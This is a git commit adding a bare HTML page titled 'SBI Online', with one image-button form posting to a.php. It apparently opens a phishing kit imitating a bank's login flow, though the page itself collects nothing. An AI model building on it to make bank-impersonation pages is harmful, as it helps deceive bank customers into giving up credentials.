bf6d40f4f49f85f9761cf536cc6e8bbb80faddb5
liger42 <116830888+liger42@users.noreply.github.com>
2022-10-31 10:27:45 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>SBI Online</title>
+</head>
+<body>
+<form Name="" Method="post" Action="a.php">
+
+<input Name="IB1" type="image" src="start.png"> 
+
+
+    
+ 
+
+ 
+</form>
+</body>
+</html>
